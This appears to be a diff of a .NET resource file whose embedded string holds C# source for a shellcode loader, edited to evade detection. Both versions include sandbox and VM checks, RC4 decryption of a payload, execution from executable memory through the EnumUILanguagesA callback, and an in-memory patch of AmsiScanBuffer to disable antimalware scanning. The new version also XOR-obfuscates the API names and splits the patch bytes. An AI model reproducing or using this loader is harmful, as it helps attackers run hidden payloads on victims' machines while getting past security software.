@@ -119,20 +119,57 @@
   </resheader>
   <data name="String1" xml:space="preserve">
     <value>using System;
-using System.IO;
-using System.IO.Compression;
+using System.Data;
 using System.Linq;
-using System.Management;
 using System.Reflection.Emit;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
 using System.Text;
+using System.Windows.Forms;
+using System.Management;
 
-namespace v
+namespace WindowsFormsApp7
 {
-    internal static class Module1
+    public partial class Form1 : Form
     {
+        public Form1()
+        {
+            try
+            {
+                if (Environment.UserName.ToLower().Contains("john"))
+                    return;
+                if (IsVM())
+                    return;
+                byte[] ont = { lol };
+                byte[] Xpayload = RC4decrypt(ont, "kkkkk");
+                IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
+                Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
+                By();
+                EnumUILanguagesA(p, 0, IntPtr.Zero);
+            }
+            catch { }
+        }
+
+        public static string Xor(string bufferstrring, string xorKey)
+        {
+            byte[] buffer = Encoding.UTF8.GetBytes(bufferstrring);
+            char[] key = xorKey.ToCharArray();
+            byte[] newByte = new byte[buffer.Length];
+
+            int j = 0;
+
+            for (int i = 0; i &lt; buffer.Length; i++)
+            {
+                if (j == key.Length)
+                {
+                    j = 0;
+                }
+                newByte[i] = (byte)(buffer[i] ^ Convert.ToByte(key[j]));
+                j++;
+            }
+            return Encoding.UTF8.GetString(newByte);
+        }
+
         [Flags]
         public enum AllocationType
         {
@@ -191,7 +228,7 @@ namespace v
 
         public static byte[] RC4decrypt(byte[] D1, string D2)
         {
-            byte[] D3 = System.Text.Encoding.ASCII.GetBytes(D2);
+            byte[] D3 = Encoding.ASCII.GetBytes(D2);
             uint D4 = 0;
             uint D5 = 0;
             uint D6 = 0;
@@ -221,19 +258,6 @@ namespace v
             }
             return D8;
         }
-        static void Main()
-        {
-            if (Environment.UserName.ToLower().Contains("john"))
-                return;
-            if (IsVM())
-                return;
-            byte[] ont = { lol };
-            byte[] Xpayload = RC4decrypt(ont, "kkkkk");
-            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
-            Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
-            Bypass();
-            EnumUILanguagesA(p, 0, IntPtr.Zero);
-        }
 
         public static bool IsVM()
         {
@@ -254,43 +278,28 @@ namespace v
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
-        public static string Bypass()
+        public static byte[] addBytes(byte[] data1, byte[] data2)
         {
-            Module1.VirtualAllocExNuma(Module1.GetCurrentProcess(), IntPtr.Zero, 4096U, 12288U, 4U, 0U);
-            IntPtr hModule = Module1.LoadLibrary(Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String("WVcxemFTNWtiR3c9")))));
-            string @string = Encoding.UTF8.GetString(Convert.FromBase64String("UVcxemFWTmpZVzVDZFdabVpYST0="));
-            string string2 = Encoding.ASCII.GetString(Convert.FromBase64String(@string));
-            IntPtr procAddress = Module1.GetProcAddress(hModule, string2);
-            byte[] getPatch = Module1.GetPatch;
-            uint flNewProtect;
-            Module1.VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), 64U, out flNewProtect);
+            byte[] data3 = new byte[data1.Length + data2.Length];
+            Array.Copy(data1, 0, data3, 0, data1.Length);
+            Array.Copy(data2, 0, data3, data1.Length, data2.Length);
+            return data3;
+        }
+        public static void By()
+        {
+            VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 4096U, 12288U, 4U, 0U);
+            IntPtr hModule = LoadLibrary(Xor("R[CZ", "360") + ".dll");
+            string string2 = Xor("sXC[fSS[", "250") + "Buffer";
+            IntPtr procAddress = GetProcAddress(hModule, string2);
+            byte[] getPatch;
+            if (IntPtr.Size == 8)
+                getPatch = addBytes(new byte[] { 0xB8, 0x57, 0x00 }, new byte[] { 0x07, 0x80, 0xC3 });
+            else
+                getPatch = addBytes(new byte[] { 0xB8, 0x57, 0x00, 0x07 }, new byte[] { 0x80, 0xC2, 0x18, 0x00 });
+
+            VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), 64U, out uint flNewProtect);
             Marshal.Copy(getPatch, 0, procAddress, getPatch.Length);
-            uint num;
-            Module1.VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), flNewProtect, out num);
-            return Encoding.UTF8.GetString(Convert.FromBase64String("T0s="));
-
-        }
-        static byte[] GetPatch
-        {
-            get
-            {
-                if (Is64Bit)
-                {
-                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-                }
-
-                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-            }
-        }
-
-        static bool Is64Bit
-        {
-            get
-            {
-                return IntPtr.Size == 8;
-            }
+            VirtualProtect(procAddress, (UIntPtr)((ulong)((long)getPatch.Length)), flNewProtect, out uint num);
         }
     }
 }</value>
